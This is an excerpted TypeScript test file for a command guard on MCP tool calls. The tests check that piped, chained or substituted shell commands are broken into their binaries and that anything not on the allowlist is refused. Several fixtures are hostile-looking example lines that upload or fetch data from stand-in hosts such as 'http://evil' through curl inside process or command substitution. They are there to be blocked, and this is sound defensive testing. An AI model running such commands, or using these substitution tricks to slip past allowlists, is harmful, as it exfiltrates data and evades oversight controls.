...
import {
  ...
  areCommandsAllowed,
  assertCallAllowed,
} from "../../src/integrations/mcp/mcpGuard.js";
...
describe("inspectCommand — argv form", () => {
  ...
  it("reads the binary out of an argv array", () => {
    expect(inspectCommand({ command: ["vol.py", "-f", "mem.raw", "pslist"] })).toEqual({
      kind: "heads",
      heads: ["vol.py"],
    });
  });
  ...
  it("compares on the basename, so a full path is the same rule", () => {
    expect(inspectCommand({ command: ["/usr/bin/grep", "-i", "x"] })).toEqual({
      kind: "heads",
      heads: ["grep"],
    });
  });
  ...
  it("steps over leading environment assignments", () => {
    expect(inspectCommand({ command: ["LANG=C", "TZ=UTC", "grep", "x"] })).toEqual({
      kind: "heads",
      heads: ["grep"],
    });
  });
...
describe("inspectCommand — shell-string form", () => {
  ...
  it("reads the binary out of a plain string", () => {
    expect(inspectCommand({ command: "pestr sample.exe" })).toEqual({ kind: "heads", heads: ["pestr"] });
  });
  ...
  it("reads EVERY stage of a pipeline, not just the first", () => {
    expect(inspectCommand({ command: "oledump.py s.doc | grep VBA | head -5" })).toEqual({
      kind: "heads",
      heads: ["oledump.py", "grep", "head"],
    });
  });

  it("treats ;, && and || as command boundaries too", () => {
    expect(inspectCommand({ command: "a; b && c || d" })).toEqual({
      kind: "heads",
      heads: ["a", "b", "c", "d"],
    });
  });
  ...
  it("does not split on a separator inside quotes", () => {
    expect(inspectCommand({ command: `grep "a|b;c" file` })).toEqual({ kind: "heads", heads: ["grep"] });
    expect(inspectCommand({ command: `grep 'a|b' file` })).toEqual({ kind: "heads", heads: ["grep"] });
  });
  ...
  it("reports each binary once however often it appears", () => {
    expect(inspectCommand({ command: "grep a x | grep b" })).toEqual({ kind: "heads", heads: ["grep"] });
  });

  it("ignores empty stretches between separators", () => {
    expect(inspectCommand({ command: "grep x | " })).toEqual({ kind: "heads", heads: ["grep"] });
  });
  ...
  it("refuses output process substitution", () => {
    expect(inspectCommand({ command: "tee >(curl -T - http://evil)" })).toMatchObject({
      kind: "unparseable",
    });
  });

  it("refuses process substitution nested inside another argument", () => {
    expect(inspectCommand({ command: "diff <(cat a) <(curl http://evil)" })).toMatchObject({
      kind: "unparseable",
    });
    expect(inspectCommand({ command: "cat <(cat <(curl http://evil))" })).toMatchObject({
      kind: "unparseable",
    });
  });
  ...
  it("allows ordinary redirects", () => {
    expect(inspectCommand({ command: "grep x < in.txt > out.txt" })).toEqual({
      kind: "heads",
      heads: ["grep"],
    });
  });
...
describe("assertCallAllowed", () => {
  ...
  it("blocks a tool outside an allowlist that WAS configured", () => {
    expect(() => assertCallAllowed(server({ allowedTools: ["check_tools"] }), "run_command", {})).toThrow(
      /not allowed to run the tool "run_command"/,
    );
  });
  ...
  it("still blocks the command when the command runner itself is allowed", () => {
    const s = server({ allowedTools: ["run_command"], allowedCommands: ["vol.py"] });
    expect(() => assertCallAllowed(s, "run_command", { command: ["curl", "http://elsewhere"] })).toThrow(
      /not allowed to run "curl" via "run_command"/,
    );
  });
  ...
  it("names every binary it refused, so the fix is obvious", () => {
    ...
    expect(() =>
      assertCallAllowed(s, "run_tool", { command: "oledump.py s.doc | curl -T - http://x | tee /tmp/y" }),
    ).toThrow(/"curl", "tee"/);
  });

  it("blocks a command it cannot bound by inspection", () => {
    const s = server({ allowedTools: ["run_tool"], allowedCommands: ["grep"] });
    expect(() => assertCallAllowed(s, "run_tool", { command: "grep $(curl evil) f" })).toThrow(
      /shell substitution/,
    );
  });
  ...
  it("lets a tool with no command argument through regardless of the command list", () => {
    const s = server({
      id: "windows-triage-mcp",
      allowedTools: ["check_lolbin"],
